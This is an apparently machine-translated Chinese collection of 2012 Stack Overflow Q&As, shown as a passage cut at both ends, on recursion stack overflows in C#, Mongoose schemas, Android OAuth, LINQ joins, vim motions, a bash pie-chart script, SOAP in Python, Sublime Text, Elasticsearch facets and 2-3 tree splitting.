很多人更喜欢 pull 方法，但两者都符合您的要求。请记住，大是相对的。如果文档适合内存，那么使用 DOM 几乎总是更容易。但是对于非常非常大的文档，可能根本不是一种选择。

# c# - 创建新流程是否有助于我遍历一棵大树？

> ID：11917806
> 
> 赞同：10
> 
> 时间：2012-08-11T21:27:49.247
> 
> 标签：c#, tree-traversal

让我们把它想象成一棵家谱，父亲有孩子，那些孩子有孩子，那些孩子有孩子，等等......所以我有一个递归函数，让父亲使用递归来获取孩子，现在只需打印它们调试输出窗口...但是在某些时候（让它运行一个小时并打印 26000 行之后）它给了我一个 StackOverFlowException。

**那么我真的内存不足了吗？嗯？那么我不应该得到“内存不足异常”吗？** 在其他帖子上，我发现人们说如果递归调用的数量太多，你可能仍然会得到 SOF 异常......

无论如何，我的第一个想法是将树分解成更小的子树..所以我知道我的根父亲总是有这五个孩子，所以我没有在根传递给它的情况下调用我的方法，而是说好的用根通行证的孩子调用它五次..它帮助我认为..但其中一个仍然很大 - 崩溃时有 26000 行 - 仍然存在这个问题。

**应用程序域和在运行时以某种深度创建新进程怎么样？** 这有帮助吗？

**如何创建我自己的 Stack 并使用它而不是递归方法？这有帮助吗？**

这也是我的代码的高级，请看一下，也许这实际上有一些愚蠢的错误导致 SOF 错误：

```
private void MyLoadMethod(string conceptCKI)
{

// make some script calls to DB, so that moTargetConceptList2 will have Concept-Relations for the current node. 

            // when this is zero, it means its a leaf. 
            int numberofKids = moTargetConceptList2.ConceptReltns.Count();
            if (numberofKids == 0)
                return;
            for (int i = 1; i <= numberofKids; i++)
            {
                oUCMRConceptReltn = moTargetConceptList2.ConceptReltns.get_ItemByIndex(i, false);

                //Get the concept linked to the relation concept
                if (oUCMRConceptReltn.SourceCKI == sConceptCKI)
                {
                    oConcept = moTargetConceptList2.ItemByKeyConceptCKI(oUCMRConceptReltn.TargetCKI, false);
                }
                else
                {
                    oConcept = moTargetConceptList2.ItemByKeyConceptCKI(oUCMRConceptReltn.SourceCKI, false);
                }

                //builder.AppendLine("\t" + oConcept.PrimaryCTerm.SourceString);
                Debug.WriteLine(oConcept.PrimaryCTerm.SourceString);

                MyLoadMethod(oConcept.ConceptCKI);
            }
        } 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-11T21:31:20.870

> 如何创建我自己的 Stack 并使用它而不是递归方法？这有帮助吗？

是的！

当您实例化 a 时，`Stack<T>`这将存在于*堆上*并且可以任意增长（直到您耗尽可寻址内存）。

如果您使用递归，则使用*调用堆栈*。调用堆栈比堆小得多。默认值为每个线程 1 MB 的调用堆栈空间。请注意，这可以更改，但不建议这样做。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-11T22:58:44.787

StackOverflowException 与 OutOfMemoryException 完全不同。

OOME 意味着进程根本没有可用的内存。这可能是在尝试使用新堆栈创建新线程时，或者在尝试在堆上创建新对象时（以及其他一些情况）。

SOE 表示线程的堆栈 - 默认情况下为 1M，尽管它可以在线程创建时设置不同，或者如果可执行文件具有不同的默认值；因此 ASP.NET 线程默认为 256k 而不是 1M - 已用尽。这可能是在调用方法或分配本地时。

当你调用一个函数（方法或属性）时，调用的参数放在堆栈上，函数返回时应该返回的地址放在堆栈上，然后执行跳转到被调用的函数。然后一些本地人将被放置在堆栈上。随着功能继续执行，可能会在其上放置更多内容。`stackalloc`还将显式使用一些堆栈空间，否则将使用堆分配。

然后它调用另一个函数，同样的事情又发生了。然后该函数返回，执行跳转回存储的返回地址，堆栈内的指针向上移动（无需清理堆栈上的值，它们现在被忽略）并且该空间再次可用.

如果你用完那 1M 的空间，你会得到一个`StackOverflowException`. 因为 1M（甚至 256k）对于这些用途来说是大量内存（我们不会将非常大的对象放入堆栈），所以可能导致 SOE 的三件事是：

1.  有人认为`stackalloc`在不使用的时候使用优化是个好主意，他们很快就用完了那 1M。
2.  有人认为通过创建一个比通常堆栈更小的线程来优化是一个好主意，而实际上他们用完了那个小堆栈。
3.  递归调用（无论是直接调用还是通过多个步骤）都会陷入无限循环。
4.  它不是无限的，但它足够大。

你有第 4 种情况。第 1 和第 2 种情况很少见（你需要非常谨慎地冒险）。案例 3 是迄今为止最常见的，它表示递归不应该是无限的错误，但错误意味着它是无限的。

具有讽刺意味的是，在这种情况下，您应该很高兴您采用了递归方法而不是迭代方法 - SOE 揭示了错误及其所在位置，而使用迭代方法，您可能会有一个无限循环，使一切都停止，这可以更难找到。

现在对于案例 4，我们有两个选择。在非常罕见的情况下，我们的调用稍微太多了，我们可以在具有更大堆栈的线程上运行它。这不适用于你。

相反，您需要从递归方法更改为迭代方法。大多数时候，这并不难，认为它可能很繁琐。该方法没有再次调用自身，而是使用循环。例如，考虑阶乘方法的经典教学示例：

```
private static int Fac(int n)
{
  return n <= 1 ? 1 : n * Fac(n - 1);
} 
```

我们不使用递归，而是使用相同的方法循环：

```
private static int Fac(int n)
{
  int ret = 1;
  for(int i = 1; i <= n, ++i)
    ret *= i;
  return ret;
} 
```

您可以看到为什么这里的堆栈空间较少。迭代版本也将在 99% 的时间内更快。现在，假设我们不小心调用`Fac(n)`了第一个，而忽略了`++i`第二个 - 每个中的等效错误，它会导致第一个中的 SOE 和一个永远不会在第二个中停止的程序。

对于您正在谈论的那种代码，您会根据以前的结果不断产生越来越多的结果，您可以将获得的结果放入数据结构中（`Queue<T>` 并且`Stack<T>`两者都适用于很多例）所以代码变成了类似的东西）：

```
private void MyLoadMethod(string firstConceptCKI)
{
  Queue<string> pendingItems = new Queue<string>();
  pendingItems.Enqueue(firstConceptCKI);
  while(pendingItems.Count != 0)
  {
    string conceptCKI = pendingItems.Dequeue();
    // make some script calls to DB, so that moTargetConceptList2 will have Concept-Relations for the current node. 
    // when this is zero, it means its a leaf. 
    int numberofKids = moTargetConceptList2.ConceptReltns.Count();
    for (int i = 1; i <= numberofKids; i++)
    {
        oUCMRConceptReltn = moTargetConceptList2.ConceptReltns.get_ItemByIndex(i, false);

        //Get the concept linked to the relation concept
        if (oUCMRConceptReltn.SourceCKI == sConceptCKI)
        {
            oConcept = moTargetConceptList2.ItemByKeyConceptCKI(oUCMRConceptReltn.TargetCKI, false);
        }
        else
        {
            oConcept = moTargetConceptList2.ItemByKeyConceptCKI(oUCMRConceptReltn.SourceCKI, false);
        }

        //builder.AppendLine("\t" + oConcept.PrimaryCTerm.SourceString);
        Debug.WriteLine(oConcept.PrimaryCTerm.SourceString);

        pendingItems.Enque(oConcept.ConceptCKI);
    }
  }
} 
```

（我还没有完全检查这一点，只是添加了排队而不是递归到您问题中的代码）。

然后，这应该与您的代码或多或少相同，但是是迭代的。希望这意味着它会起作用。请注意，如果您检索的数据有循环，则此代码中可能存在无限循环。在这种情况下，当这个代码用太多东西填满队列时，它会抛出一个异常。您可以调试源数据，也可以使用 a`HashSet`来避免将已处理的项目排入队列。

编辑：更好地添加如何使用 HashSet 来捕获重复项。首先设置一个 HashSet，这可能只是：

```
HashSet<string> seen = new HashSet<string>(); 
```

或者，如果字符串不区分大小写，则最好使用：

```
HashSet<string> seen = new HashSet<string>(StringComparison.InvariantCultureIgnoreCase) // or StringComparison.CurrentCultureIgnoreCase if that's closer to how the string is used in the rest of the code. 
```

然后在你去使用这个字符串之前（或者在你去把它添加到队列之前，你有以下之一：

如果不应该发生重复的字符串：

```
if(!seen.Add(conceptCKI))
  throw new InvalidOperationException("Attempt to use \" + conceptCKI + "\" which was already seen."); 
```

或者如果重复的字符串是有效的，我们只想跳过执行第二次调用：

```
if(!seen.Add(conceptCKI))
  continue;//skip rest of loop, and move on to the next one. 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T21:55:24.043

我认为您有一个递归环（无限递归），而不是真正的堆栈溢出错误。如果你有更多的堆栈内存 - 你也会得到溢出错误。

**为了测试它：**

声明一个用于存储可操作对象的全局变量：

```
private Dictionary<int,object> _operableIds = new Dictionary<int,object>();

...
private void Start()
{
    _operableIds.Clear();
    Recurtion(start_id);
}
...
private void Recurtion(int object_id)
{
   if(_operableIds.ContainsKey(object_id))
      throw new Exception("Have a ring!");
   else
     _operableIds.Add(object_id, null/*or object*/);

   ...
   Recurtion(other_id)
   ...
   _operableIds.Remove(object_id);
} 
```

# mongodb - 猫鼬中的嵌套对象模式

> ID：11917808
> 
> 赞同：4
> 
> 时间：2012-08-11T21:27:57.950
> 
> 标签：mongodb, mongoose

假设我有这样的架构

```
var Language = new Schema({
    name: { type: String, unique: true, required: true },
    pos: [{
        name: String,
        attributes: [{
            name: String
        }]
    }]
}); 
```

`pos`和 中的每个项目都会`attributes`有一个`_id`? `name`如果我向数组中的字段添加唯一索引`pos`，是否会对该数组强制执行唯一性，还是对所有条目都是唯一的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-12T04:14:33.437

不，没有自己的架构的嵌入式文档`pos`没有`attributes`属性`_id`。

如果为数组中的`name`字段添加唯一索引`pos`，则将在整个集合中强制执行唯一性，但**不会**在单个文档的数组中强制执行唯一性。看到[这个帖子](https://stackoverflow.com/questions/6743849/mongodb-unique-index-on-array-elements-property)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-04-22T13:26:45.253

在 Mongoose 4 中，`pos`会`attributes`得到自己的架构。您可以阻止他们获取 _id 属性，如下所示：

```
// ...
    attributes: [{
        name: String,
        _id: false
    }]
// ... 
```

# android - Android- Oauth 2.0 谷歌登录

> ID：11917812
> 
> 赞同：0
> 
> 时间：2012-08-11T21:28:38.697
> 
> 标签：android, oauth-2.0, google-signin

需要良好且简单的 android 应用程序示例，该示例需要我可以在我的应用程序中使用的 google auth 登录。我是 OAuth 的新手，所以我正在尝试我得到的每个示例。

我已经用 facebook 进行了 autentication，得到了用户名和所有基本信息。在 facebook 我研究了这个例子：[http ://blog.doityourselfandroid.com/2011/02/28/30-minute-guide-integrating-facebook-android-application/](http://blog.doityourselfandroid.com/2011/02/28/30-minute-guide-integrating-facebook-android-application/)

但是当我从这个例子中尝试时：[http://blog.doityourselfandroid.com/2011/08/06/oauth-2-0-flow-android/](http://blog.doityourselfandroid.com/2011/08/06/oauth-2-0-flow-android/) 注册的应用程序和导入的项目通过 git 进入 Eclipse 只是无法运行。一步一步地跟随一切。JsonFactory 总是出错。

代码：

```
private void performApiCall() {
    try {
        JsonFactory jsonFactory = new JacksonFactory();
        HttpTransport transport = new NetHttpTransport();

        CredentialStore credentialStore = new SharedPreferencesCredentialStore(prefs);
        AccessTokenResponse accessTokenResponse = credentialStore.read();

        GoogleAccessProtectedResource accessProtectedResource = new GoogleAccessProtectedResource(accessTokenResponse.accessToken,
                transport,
                jsonFactory,
                OAuth2ClientCredentials.CLIENT_ID,
                OAuth2ClientCredentials.CLIENT_SECRET,
                accessTokenResponse.refreshToken);

        final Latitude latitude = new Latitude(transport, accessProtectedResource, jsonFactory);
        latitude.apiKey=OAuth2ClientCredentials.API_KEY;

        LatitudeCurrentlocationResourceJson currentLocation = latitude.currentLocation.get().execute();
        String locationAsString = convertLocationToString(currentLocation);
        textView.setText(locationAsString);
    } catch (Exception ex) {
        ex.printStackTrace();
        textView.setText("Error occured : " + ex.getMessage());
    }
} 
```

错误代码：

```
08-11 21:45:33.606: W/dalvikvm(464): threadid=3: thread exiting with uncaught exception (group=0x4001b188)
08-11 21:45:33.606: E/AndroidRuntime(464): Uncaught handler: thread main exiting due to uncaught exception
08-11 21:45:33.606: E/AndroidRuntime(464): java.lang.NoClassDefFoundError: com.google.api.client.json.jackson.JacksonFactory
08-11 21:45:33.606: E/AndroidRuntime(464):  at com.ecs.android.sample.oauth2.LatitudeApiSample.performApiCall(LatitudeApiSample.java:79)
08-11 21:45:33.606: E/AndroidRuntime(464):  at com.ecs.android.sample.oauth2.LatitudeApiSample.onCreate(LatitudeApiSample.java:61)
08-11 21:45:33.606: E/AndroidRuntime(464):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
08-11 21:45:33.606: E/AndroidRuntime(464):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2459)
08-11 21:45:33.606: E/AndroidRuntime(464):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2512)
08-11 21:45:33.606: E/AndroidRuntime(464):  at android.app.ActivityThread.access$2200(ActivityThread.java:119)
08-11 21:45:33.606: E/AndroidRuntime(464):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1863)
08-11 21:45:33.606: E/AndroidRuntime(464):  at android.os.Handler.dispatchMessage(Handler.java:99)
08-11 21:45:33.606: E/AndroidRuntime(464):  at android.os.Looper.loop(Looper.java:123)
08-11 21:45:33.606: E/AndroidRuntime(464):  at android.app.ActivityThread.main(ActivityThread.java:4363)
08-11 21:45:33.606: E/AndroidRuntime(464):  at java.lang.reflect.Method.invokeNative(Native Method)
08-11 21:45:33.606: E/AndroidRuntime(464):  at java.lang.reflect.Method.invoke(Method.java:521)
08-11 21:45:33.606: E/AndroidRuntime(464):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:860)
08-11 21:45:33.606: E/AndroidRuntime(464):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:618)
08-11 21:45:33.606: E/AndroidRuntime(464):  at dalvik.system.NativeStart.main(Native Method)
08-11 21:45:33.616: I/dalvikvm(464): threadid=7: reacting to signal 3
08-11 21:45:33.616: E/dalvikvm(464): Unable to open stack trace file '/data/anr/traces.txt': Permission denied 
```

如果有人知道什么是问题，或者可以发布一些带有源代码和良好解释的项目链接。

我的应用只需要通过 google auth 登录并获取用户名。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T00:12:40.077

您的项目中缺少一个 jar 文件，它显示：

```
java.lang.NoClassDefFoundError: com.google.api.client.json.jackson.JacksonFactory 
```

因此，您可能想从这里找到它：

```
http://code.google.com/p/google-api-java-client/ 
```

如果您有库，那么您可能只需要检查 jar 文件即可将其导出，您可以在此答案中找到如何执行此操作的屏幕截图：

[https://stackoverflow.com/a/9937414/67566](https://stackoverflow.com/a/9937414/67566)

如果您转到配置构建路径，然后在订购和导出选项卡下，验证您的 jar 文件旁边的复选框是否已选中，这可能会解决您的问题。

# linq - Linq 外连接 - 不想要 DefaultIfEmpty，而想要 NullIfEmpty

> ID：11917813
> 
> 赞同：0
> 
> 时间：2012-08-11T21:28:43.570
> 
> 标签：linq, dynamics-crm-2011

全部，

此问题与 Dynamics CRM 2011 Linq 提供程序有关 - 它确实有很多怪癖。但是，我没有标记它，因为我*认为*这是一个一般的 Linq 问题。

我有一门课——产品。它有一个 Price 类型的属性（比如 ProductPrice）。

我正在 Linq 中对此进行外部联接。CRM 文档说外部连接是不可能的，但它似乎工作（我在这里问的明显问题）。

所以说我正在做类似的事情：（为伪 linq 道歉）

```
 IList<Product> products = (from p in xrmContext.Products 
                                  join pr in xrmContext.Prices
                                  on p.ProductId equals pr.ProductId into prx from prices in prx.DefaultIfEmpty
                                  select new Product { ProductName = p.productName, ProductPrice = new Price { Amount = prices.PriceValue }).ToList(); 
```

这在一定程度上很有效。它创建所有产品，无论它们是否具有价格对象。上衣。

问题是 DefaultIfEmpty。毫无疑问，如果产品没有价格，则此 DefaultIfEmpty 将创建一个“默认”价格对象……即具有空值的对象。我*真正*想要的是没有价格对象 - 即 null，而不是“空白”对象。

这怎么可能？

我通过测试空白价格名称来解决它 - ProductPrice = price.priceName == "" ？null : 新价格 ...

能够做类似 NullIfEmpty 的事情会很好。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:36:08.053

您可以跳过加入：

```
from p in xrmContext.Products 
let price = xrmContext.Prices.FirstOrDefault(pr => pr.ProductID == p.ProductID)
select new Product()
{ 
    ProductName = p.productName,
    ProductPrice = price != null ? new Price() { Amount = price.PriceValue } : null
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T08:06:22.917

crm 2011 linq 不支持外连接。如果您尝试 Amiram 的代码 - 在评估选择时，您将收到错误“产品不包含属性“pricevalue””。

# vim - vim中$和g_的区别？

> ID：11917814
> 
> 赞同：14
> 
> 时间：2012-08-11T21:28:47.650
> 
> 标签：vim

我试图在 vim 中学习一些新的简洁快捷方式，然后我发现了 g_。根据 [http://yannesposito.com/Scratch/en/blog/Learn-Vim-Progressively/](http://yannesposito.com/Scratch/en/blog/Learn-Vim-Progressively/)

```
$  → go to the end of line
g_ → go to the last non-blank character of line 
```

我什么时候可以使用 g_ 而不是 $？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-12T01:38:46.803

`g_`当您将文本粘贴到您不希望包含换行符的地方时，这真是太棒了——就像命令行一样，它将自动运行命令。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-11T21:35:30.117

我认为最重要的区别在帮助文件中简单说明：

```
:h $
In Visual mode the cursor goes to just after the last character in the line. 
```

因此，如果您这样做`v``$``d`，则会删除“在最后一个字符之后”，这是换行符，因此它将把它下面的行带到当前行。但如果你这样做`v``g_``d`，它将保留换行符。

我其实不知道`g_`，似乎很有用。

**编辑**由于这个答案得到了赞成，我已经使用`g_`（及其相反，`_`）来制作一个映射，该映射将删除/删除当前行，不包括前导/尾随空格和换行符：

```
" delete/yank line, but only whitespace-trimmed version
nnoremap <Leader>dd _yg_"_dd
nnoremap <Leader>yy _yg_ 
```

# linux - 使用 Bash Shell 脚本制作简单的饼图

> ID：11917818
> 
> 赞同：1
> 
> 时间：2012-08-11T21:29:29.263
> 
> 标签：linux, bash, shell, solaris, sunos

下面是我正在执行我的两个 Hive SQL 查询的 Bash Shell 脚本，它工作正常。我正在`Error Percentage`这个 Bash Shell 脚本中计算。

```
#!/bin/bash

QUERY1=`hive -e "
set mapred.job.queue.name=hdmi-technology;
SELECT SUM(total_items_purchased), SUM(total_items_missingormismatch) from lip_data_quality where dt='$DATE_YEST_FORMAT2';"`

QUERY2=`hive -e "
set mapred.job.queue.name=hdmi-technology;
SELECT 100 * SUM(total_items_missingormismatch*1.0) / SUM(total_items_purchased) FROM lip_data_quality where dt='$DATE_YEST_FORMAT2';"`

mailx -s "LIP Data Quality Report for $DATE_YEST_FORMAT1" -r rj@host.com rj@host.com  <<EOF
Data Successfully loaded into LIP_DATA_QUALITY table

Total Items Purchased: `echo $QUERY1 | awk '{print $1}'`

Total Items MissingorMismatch: `echo $QUERY1 | awk '{print $2}'`

Error Percentage: $QUERY2
EOF 
```

**问题陈述：-**

我会得到`Error Percentage`号码`$QUERY2`。我需要制作一个简单的饼图，它可以使用 Bash Shell 脚本显示`Error Percentage`并`No Error Percentage`使用下图中的数字。`$QUERY2`

![在此处输入图像描述](../Images/c48b675176bac56e09ee685a4b396dbb.png)

我正在跑步`SunOS`。这可以在 Bash Shell 脚本中执行吗？任何想法将不胜感激。

**更新：-**

下面是我正在使用的 Shell 脚本，我使用`vi editor`.

```
 1  #! /bin/bash
 2
 3  TEMP=$(mktemp -t chart)
 4  QUERY1=36
 5  QUERY2=64
 6  cat > $TEMP <<EOF
 7      <html>
 8        <head>
 9          <!--Load the AJAX API-->
10          <script type="text/javascript" src="https://www.google.com/jsapi"></script>
11          <script type="text/javascript">
12
13            // Load the Visualization API and the piechart package.
14            google.load('visualization', '1.0', {'packages':['corechart']});
15
16            // Set a callback to run when the Google Visualization API is loaded.
17            google.setOnLoadCallback(drawChart);
18
19            // Callback that creates and populates a data table,
20            // instantiates the pie chart, passes in the data and
21            // draws it.
22            function drawChart() {
23
24              // Create the data table.
25              var data = new google.visualization.DataTable();
26              data.addColumn('string', 'Title');
27              data.addColumn('number', 'Value');
28              data.addRows([
29                ['Error Percentage', $QUERY1],
30                ['No Error Percentage', $QUERY2]
31              ]);
32
33              // Set chart options
34              var options = {'title':'Errors',
35                             'width':400,
36                             'height':300};
37
38              // Instantiate and draw our chart, passing in some options.
39              var chart = new google.visualization.PieChart(document.getElementById('chart_div'));
40              chart.draw(data, options);
41            }
42          </script>
43        </head>
44
45        <body>
46          <!--Div that will hold the pie chart-->
47          <div id="chart_div"></div>
48        </body>
49      </html>
50      EOF
51
52      # open browser
53      case $(uname) in
54         Darwin)
55            open -a /Applications/Google\ Chrome.app $TEMP
56            ;;
57
58         Linux|SunOS)
59            firefox $TEMP
60            ;;
61       esac
62 
```

运行上述 shell 脚本后出现的错误为`sh -x chart.sh`-

```
bash-3.00$ sh -x chart.sh
chart.sh: syntax error at line 3: `TEMP=$' unexpected 
```

任何想法将不胜感激。

**另一个更新：-**

在以下建议之后，当我尝试这样的事情时，我又遇到了另一个错误。

```
bash-3.00$ bash -x chart.sh
++ mktemp -t chart
mktemp: failed to create file: /tmp/chart
+ TEMP=
+ QUERY1=36
+ QUERY2=64
+ cat
chart.sh: line 6: $TEMP: ambiguous redirect 
```

另一个更新：我猜取得了一些进展。不确定输出文件的去向？或者它会在浏览器中打开？

```
bash-3.00$ bash -x chart.sh
++ mktemp -t chart
+ TEMP=/tmp/chart
+ QUERY1=36
+ QUERY2=64
+ cat
++ uname 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-12T20:27:46.403

创建[谷歌图表](https://developers.google.com/chart/)的一种非常简单的方法：

```
#! /bin/bash

TEMP=$(mktemp -t chart.XXXXX)
QUERY1=36
QUERY2=64
cat > $TEMP <<EOF
<html>
  <head>
    <!--Load the AJAX API-->
    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
    <script type="text/javascript">

      // Load the Visualization API and the piechart package.
      google.load('visualization', '1.0', {'packages':['corechart']});

      // Set a callback to run when the Google Visualization API is loaded.
      google.setOnLoadCallback(drawChart);

      // Callback that creates and populates a data table,
      // instantiates the pie chart, passes in the data and
      // draws it.
      function drawChart() {

        // Create the data table.
        var data = new google.visualization.DataTable();
        data.addColumn('string', 'Title');
        data.addColumn('number', 'Value');
        data.addRows([
          ['Error Percentage', $QUERY1],
          ['No Error Percentage', $QUERY2]
        ]);

        // Set chart options
        var options = {'title':'Errors',
                       'width':400,
                       'height':300};

        // Instantiate and draw our chart, passing in some options.
        var chart = new google.visualization.PieChart(document.getElementById('chart_div'));
        chart.draw(data, options);
      }
    </script>
  </head>

  <body>
    <!--Div that will hold the pie chart-->
    <div id="chart_div"></div>
  </body>
</html>
EOF

# open browser
case $(uname) in
   Darwin)
      open -a /Applications/Google\ Chrome.app $TEMP
      ;;

   Linux|SunOS)
      firefox $TEMP
      ;;
 esac 
```

如果您将其另存为，`chart.sh`则将其运行为

```
$ bash -x chart.sh 
```

或者

```
$ chmod +x chart.sh
$ ./chart.sh 
```

这给了你类似的东西

![在此处输入图像描述](../Images/29749390f1db8df15e4df3654aab7686.png)

请注意，您只需要`bash`和 Internet 连接，无需安装任何东西。

`mktemp`应该在 Solaris ( [http://docs.oracle.com/cd/E23824_01/html/821-1461/mktemp-1.html](http://docs.oracle.com/cd/E23824_01/html/821-1461/mktemp-1.html) ) 中可用。如果您没有它，只需将 TEMP 设置为您希望 HTML 输出成为的任何文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-12T03:30:22.310

仅在 shell 中创建饼图的一种简单方法是生成 svg 图像。

Ploticus 是一个生成其他图像类型的简单/小程序。 [http://ploticus.sourceforge.net/doc/welcome.html](http://ploticus.sourceforge.net/doc/welcome.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-12T02:46:57.133

可能没有本地方法可以做到这一点，所以我认为你最好的选择是安装第三方工具，比如 -

[`PLOTRIX`](http://cran.r-project.org/web/packages/plotrix/index.html)

[文档](http://cran.r-project.org/web/packages/plotrix/plotrix.pdf)

# php - 不接受 Python WSDL 函数参数

> ID：11917829
> 
> 赞同：1
> 
> 时间：2012-08-11T21:31:20.840
> 
> 标签：php, python, soap, wsdl

我可以像这样在 PHP 中向 SOAP 客户端发送函数参数（`searchLinks`是方法名称）：

```
$client = new SoapClient("https://linksearch.api.cj.com/wsdl/version2/linkSearchServiceV2.wsdl",   array('trace'=> true));
$results = $client->searchLinks(array("developerKey" => $developerKey,
                                             "token" => '',
                                         "websiteId" => $websiteId,
                                     "advertiserIds" => 'joined')); 
```

如果我想在 Python 中做同样的事情，我该怎么做？这是目前的代码：

```
server=WSDL.Proxy(url)
results=server.searchLinks({'developerkey':dev_key,'token':'','websiteId':website_id,'advertiserIds':'joined'}) 
```

当我尝试运行这个 Python 脚本时，它会抛出错误。为什么它不像 PHP 那样采用函数参数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T23:03:42.113

您使用的是哪个库，

假设您使用的是 SOAPpy，您可以执行 .

```
#!/usr/bin/python

import SOAPpy

url= 'https://linksearch.api.cj.com/wsdl/version2/linkSearchServiceV2.wsdl'
proxy = SOAPpy.WSDL.Proxy(url)
results=proxy.searchLinks({'developerkey': 'dev_key','token':'','websiteId': 'website_id','advertiserIds':'joined'}) 
```

# syntax-highlighting - 在 Sublime Text 2 for Windows 中丢失了所有 Ruby on Rails 语法突出显示

> ID：11917834
> 
> 赞同：2
> 
> 时间：2012-08-11T21:32:32.350
> 
> 标签：syntax-highlighting, rspec-rails, sublimetext2, railstutorial.org

我对这一切都很陌生，并且正在阅读 Michael Hartl 的 Ruby on Rails 教程。我刚刚开始深入[研究第 3 章中的 Sample_App](http://ruby.railstutorial.org/chapters/static-pages#top)，只是“丢失”了我在 Sublime Text 2 for Windows 中处理的所有文件的所有语法突出显示。

语法高亮以前一直在工作，在 Sublime Text 2 中打开本节的第一个文件时，我收到以下错误消息：

> 加载语法文件“Packages/User/RSpec.tmLanguage”时出错：解析 plist xml 时出错：无法在文件“Packages/User/RSpec.tmLanguage”中打开文件

现在所有的语法高亮已经完全消失了。

我进行了一些搜索，并尝试将此[“syntax_highlighting.py”文件](https://gist.github.com/925008/79848555962eaf61847554681d8c5763f730a22b)添加到我的 Packages/User 目录中，但我仍然收到相同的错误并且仍然没有任何语法突出显示。

任何帮助我朝着正确的方向前进将不胜感激！谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T03:17:02.657

我已经纠正了这个问题。该`RSPec.tmLanguage`文件需要从 移动`Packages/rails_tutorial_sublime_text`到`Packages/User`。*完成后，我从 Sublime Text 2 的“首选项*”菜单中重新激活了我的配色方案。

有时答案隐藏在显而易见的地方，如果没有@MattYork，我实际上不会明白这一点，所以谢谢！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-09T07:26:11.460

我也刚刚为我修复了这个错误。如果有人仍然有问题，这就是我所做的：

打开`~/Library/Application Support/Sublime Text 2/Packages/User/syntax_highlighting.py`并`User/`从这些行中删除

```
if name[-8:] == "_spec.rb":
  set_syntax(view, "Rspec", "User/RSpec")
elif name == "factories.rb":
  set_syntax(view, "Rspec", "User/RSpec") 
```

重新启动 Sublime 几次。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-12T02:09:01.633

看起来这`RSpec.tmLanguage`不是 ST 识别的有效语言文件。如果你删除它，你可能会得到语法高亮显示。

# elasticsearch - 多词构面（ElasticSearch+Tire）

> ID：11917835
> 
> 赞同：1
> 
> 时间：2012-08-11T21:32:45.050
> 
> 标签：elasticsearch, tire

我的模型有一个标签字段，它是一个标签数组。我遇到的问题是我希望标签像关键字一样工作，但是 ES 以某种方式将它们分成空格以进行分面。

映射是：

```
indexes :tags, type: :array 
```

热门标签的查询是：

```
tire.search do
  facet 'tags' do
    terms :tags, size: 100
  end
end 
```

现在结果是单个单词。例如，标签为 ["retro music", "awesome"] 的唱片最终将具有三个单独的标签。同样，如果我对“复古音乐”（`must { term 'tags', options[:tag] }`）进行查询，那将失败，而对“复古”或“音乐”的查询将成功。这里期望的行为是标签应该是原子的，所以只有“复古音乐”（或“真棒”）标签搜索应该成功。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-11T23:52:51.403

默认情况下，elasticsearch 使用“标准”分析器分析字符串，该分析器将字符串转换为小写，将它们拆分为单词并删除一些频繁出现的单词（停用词）。您可以通过关闭字段标签的分析器来阻止弹性搜索执行所有这些操作：

```
indexes :tags, :type => 'string', :index => :not_analyzed 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-19T12:25:22.457

对我来说，解决方案`:index => :not_analyzed`就像上面一样，使用 Page.create_elasticsearch_index 构建索引，而不是 Page.import，如此处所示[https://stackoverflow.com/a/14693422/524458](https://stackoverflow.com/a/14693422/524458)。

# java - 2-3 树 - 分裂困难

> ID：11917840
> 
> 赞同：2
> 
> 时间：2012-08-11T21:33:47.947
> 
> 标签：java, tree

我的任务是创建一个 2-3 树。我已经完成了所有必需的类和方法，但是我的*拆分*方法遇到了困难。我可能想太多了，我的头在旋转，我似乎无法摆脱自己陷入的思绪。

如果我只需要拆分一个叶节点，我不会有问题。我的想法似乎被卡住了，我必须拆分一个叶节点，然后拆分上面的父节点。据我了解，孩子的断开连接，然后分裂，然后孩子的连接都会根据最初被分裂的孩子而有所不同。

即，如果我有以下树，我的第一个分裂发生在叶节点中（比如根的第二个孩子的第三个孩子 13 |14）。这个分裂过程的处理方式与说根的第三个孩子的第一个孩子（19 | 20）不同。

```
 9 |18
           3 |  6                          12 | 15                          21 | 24
 1 |  2    4 |  5    7 |  8      10 | 11   13 | 14   16 | 17      19 | 20   22 | 23   25 |26 
```

我遇到问题的拆分方法部分是：

```
 if (upperRight != null)
    {
        if (childIndex == 0)
        {
            parent.connectChild(1, newRight);
            newRight.connectChild(0, child1);
            newRight.connectChild(1, child2);
        }
        else if (childIndex == 1)
        {
            upperRight.connectChild(0, newRight);
        }
        else if (childIndex == 2)
        {
            upperRight.connectChild(0, newRight);
        }
    }
    else
    {
        Node temp = parent.disconnectChild(1);
        parent.connectChild(1, newRight);
        parent.connectChild(2, temp);

        if (childIndex == 0)
        {
            temp = newRight.disconnectChild(0);
            newRight.connectChild(0, child1);
            newRight.connectChild(1, child2);
